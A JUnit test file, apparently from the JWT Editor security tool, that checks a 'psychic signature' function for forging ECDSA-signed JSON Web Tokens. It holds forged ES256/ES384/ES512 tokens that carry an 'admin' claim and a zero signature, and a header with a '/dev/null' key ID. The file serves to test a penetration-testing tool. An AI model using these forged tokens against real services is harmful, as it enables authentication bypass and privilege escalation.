/*
Author : Dolph Flynn

Copyright 2023 Dolph Flynn

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package attack;

import com.blackberry.jwteditor.model.jose.JWS;
import com.blackberry.jwteditor.model.jose.JWSFactory;
import com.blackberry.jwteditor.operations.Attacks;
import com.nimbusds.jose.JWSAlgorithm;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import java.util.stream.Stream;

import static com.nimbusds.jose.JWSAlgorithm.*;
import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.params.provider.Arguments.arguments;

class PsychicSignatureAttackTest {
    private static final String TEST_JWS = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.tyh-VfuzIxCyGYDlkBA7DfyjrqmSHu6pQ2hoZuFqUSLPNY2N0mpHb3nk5K17HWP_3cYHBw7AhHale5wky6-sVA";

    private static Stream<Arguments> algorithmsAndExpectedJWTs() {
        return Stream.of(
                arguments(ES256, "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.MAYCAQACAQA"),
                arguments(ES384, "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzM4NCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.MAYCAQACAQA"),
                arguments(ES512, "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzUxMiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.MAYCAQACAQA")
        );
    }

    @ParameterizedTest
    @MethodSource("algorithmsAndExpectedJWTs")
    void givenJWS_whenSigningWithPsychicSignature_thenJWSIsCorrect(JWSAlgorithm algorithm, String expectedJWT) throws Exception {
        JWS jws = JWSFactory.parse(TEST_JWS);

        JWS attackJws = Attacks.signWithPsychicSignature(jws, algorithm);

        assertThat(attackJws.serialize()).isEqualTo(expectedJWT);
    }

    @Test
    void givenJWSWithBackslash_whenSigningWithPsychicSignature_thenHeaderInvariant() throws Exception {
        JWS jws = JWSFactory.parse("eyJraWQiOiIvZGV2L251bGwiLCJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.6mbgcHRELcZ3kLuiKcCit2ae2XNXBDcVXuS9yHydq2KCnvxgR7JLC1fzeJwv5a7KIOqoa780na3LNEhCaXPbLw");

        JWS attackJws = Attacks.signWithPsychicSignature(jws, ES256);

        assertThat(attackJws.header().decoded()).isEqualTo(jws.header().decoded());
    }

    private static Stream<JWSAlgorithm> unsupportedAlgorithms() {
        return Stream.of(
                HS256, HS384, HS512,
                RS256, RS384, RS512,
                PS256, PS384, PS512,
                EdDSA
        );
    }

    @ParameterizedTest
    @MethodSource("unsupportedAlgorithms")
    void givenJWS_whenSignPsychicSignatureAndInvalidAlgorithm_thenExceptionThrown(JWSAlgorithm algorithm) throws Exception {
        JWS jws = JWSFactory.parse(TEST_JWS);

        assertThrows(IllegalArgumentException.class, () -> Attacks.signWithPsychicSignature(jws, algorithm));
    }
}
